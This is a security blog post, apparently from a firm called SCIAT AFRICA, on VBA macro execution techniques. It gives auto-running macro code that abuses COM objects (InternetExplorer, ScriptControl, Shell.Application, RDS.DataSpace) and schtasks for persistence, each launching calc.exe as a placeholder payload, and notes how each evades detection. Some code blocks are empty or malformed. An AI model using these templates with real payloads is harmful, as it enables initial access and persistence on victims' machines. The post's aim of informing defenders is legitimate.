<h1>The Unyielding Threat: Dissecting Advanced VBA Macro Execution Techniques</h1>

The digital threat landscape continues to witness the sophisticated weaponization of VBA macros by advanced adversaries. Despite heightened security controls and widespread awareness campaigns, attackers persistently exploit the deep integration and inherent trust models of Microsoft Office applications to gain initial access. Our analysis moves beyond basic AutoOpen and Document_Open triggers to explore the more obscure, potent launchers being actively deployed in current campaigns. We will deconstruct techniques such as using the InvokeVerbEx method for shell execution and leveraging the RDS.DataSpace object for COM manipulation—methodologies we have consistently observed in operational environments. Working at SCIAT AFRICA has provided definitive evidence of how these methods effectively bypass application hardening and endpoint detection solutions, demonstrating an urgent need for defenders to deepen their understanding of this continuously evolving attack vector.



# The Art of Macro Execution: Beyond AutoOpen

In the evolving landscape of VBA macro security, attackers continue to 
develop sophisticated techniques to bypass detection and execute their 
payloads. While traditional methods like `AutoOpen` and `Document_Open` remain prevalent, advanced actors are leveraging COM object hijacking and script control to enhance their tradecraft.

## Classic COM Object Launching

vb```Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
Sub MyMacro()
 ' InternetExplorer.Application Technique
 Dim ie As Object
 Set ie = CreateObject("InternetExplorer.Application")
 ie.Navigate "javascript:new ActiveXObject('WScript.Shell').Run('calc.exe')"
 ' MSXML2.ServerXMLHTTP + WScript.Shell
 Dim xml As Object, ws As Object
 Set xml = CreateObject("MSXML2.ServerXMLHTTP")
 Set ws = CreateObject("WScript.Shell")
 ws.Run "calc.exe"
 ' Windows Media Player OCX
 Dim wmp As Object
 Set wmp = CreateObject("WMPlayer.OCX")
 wmp.URL = "file:///c:/windows/system32/calc.exe"
End Sub```

This approach demonstrates multiple COM object abuse techniques:

- **InternetExplorer.Application** leverages JavaScript execution within a browser context
  
- **MSXML2.ServerXMLHTTP** combined with WScript.Shell shows layered object creation
  
- **WMPlayer.OCX** misuse illustrates how media controls can be weaponized
  

## DotNetToJScript Style Execution

vb```Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
Sub MyMacro()
 ' Method 3: DotNetToJScript style COM approach
 Dim sc As Object
 Set sc = CreateObject("ScriptControl")
 sc.Language = "JScript"
 sc.Eval "new ActiveXObject('WScript.Shell').Run('calc.exe',1,false);"
End Sub```

This technique is particularly interesting because it:

- Uses ScriptControl to create a JScript execution environment
  
- Demonstrates cross-language code execution within VBA
  
- Shows how .NET concepts can be adapted through COM interfaces
  


{%
  include embed/video.html
  src='/assets/Videos/dotnet2jscrpt.mp4'
  types='ogg|mov'
  title='Demo video'
  autoplay=true
  loop=true
  muted=true
%}


## InvokeVerbEx and RDS.DataSpace Techniques

In our continued exploration of sophisticated VBA macro execution 
techniques, we now examine two particularly interesting methods that 
leverage Windows Shell components and remote data services to bypass 
security controls.

## InvokeVerbEx: File Association Abuse

vb```Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
Sub MyMacro()
 Dim objShell As Object
 Dim objFolder As Object
 Dim objFolderItem As Object```

```vb
Set objShell = CreateObject("Shell.Application")
Set objFolder = objShell.NameSpace("C:\Windows\System32\")
Set objFolderItem = objFolder.ParseName("calc.exe")

If Not objFolderItem Is Nothing Then
    objFolderItem.InvokeVerbEx "open"
End If
```

End Sub```

This technique demonstrates file association hijacking through Shell.Application:

- **Shell Namespace Browsing**: Accesses the System32 directory through COM
  
- **File Parsing**: Locates the target executable using ParseName
  
- **Verb Invocation**: Uses InvokeVerbEx with the "open" verb to launch the application
  

## ShellExecute: Direct Process Creation

vb

A more direct approach using ShellExecute:

- **Direct Execution**: Bypasses file parsing by directly calling ShellExecute
  
- **Window Management**: The final parameter controls window visibility
  
- **Minimal Footprint**: Fewer COM interactions than the InvokeVerbEx method
  

## RDS.DataSpace: COM Factory Abuse

vb

`Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
Sub MyMacro()
 Dim rds As Object
 On Error Resume Next
 Set rds = CreateObject("RDS.DataSpace")
 If Err.Number = 0 Then
 Dim factory As Object
 Set factory = rds.CreateObject("WScript.Shell", "")
 factory.Run "calc.exe", 1, False
 End If
 On Error GoTo 0
End Sub`

This method represents a significant escalation in technique sophistication:

- **RDS.DataSpace Object**: Originally designed for remote data access, now weaponized
  
- **Object Factory Pattern**: Creates objects through a factory interface
  
- **Error Handling**: Includes defensive programming to handle potential failures
  

## Scheduled Task Persistence: The Stealthy VBA Execution Method

In
 the ever-evolving arsenal of VBA macro techniques, attackers have 
developed increasingly sophisticated methods to maintain persistence and
 evade detection. One particularly effective approach involves 
leveraging the Windows Task Scheduler through macros, creating a 
powerful persistence mechanism that survives reboots and application 
closures.

### Scheduled Task Deployment via VBA

vb

`Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
Sub MyMacro()
 Dim ws As Object
 Set ws = CreateObject("WScript.Shell")
 ws.Run "schtasks /create /tn ""TestTask"" /tr ""calc.exe"" /sc once /st 00:00", 0, True
 ws.Run "schtasks /run /tn ""TestTask""", 0, False
End Sub`

### Technical Breakdown

This technique demonstrates a two-stage approach to execution:

**Stage 1: Task Creation**

- Uses `schtasks /create` to establish a scheduled task named "TestTask"
  
- Configures the task to run `calc.exe` as a demonstration payload
  
- Sets execution for a specific time with `/sc once /st 00:00`
  
- The `0` parameter ensures the command window remains hidden
  
- `True` parameter waits for command completion before proceeding
  

**Stage 2: Immediate Execution**

- Uses `schtasks /run` to trigger the task immediately
  
- The `False` parameter allows the macro to continue without waiting
  
- Creates separation between the macro and the final payload execution
  

### Why This Method is Effective

From our observations at SCIAT AFRICA, scheduled task abuse provides several advantages for attackers:

**Persistence Benefits:**

- **Reboot Survival**: Tasks persist through system restarts
  
- **Application Independence**: Execution continues after Office applications close
  
- **Legitimate Appearance**: Scheduled tasks are common in enterprise environments
  
- **Timing Flexibility**: Can be configured for immediate or delayed execution
  

**Evasion Advantages:**

- **Process Separation**: Decouples the macro from the final payload
  
- **Reduced Suspicion**: Task Scheduler is a trusted Windows component
  
- **Minimal Memory Footprint**: The macro itself contains no malicious code
  

### Advanced Attack Scenarios

More sophisticated attackers enhance this technique with additional features:
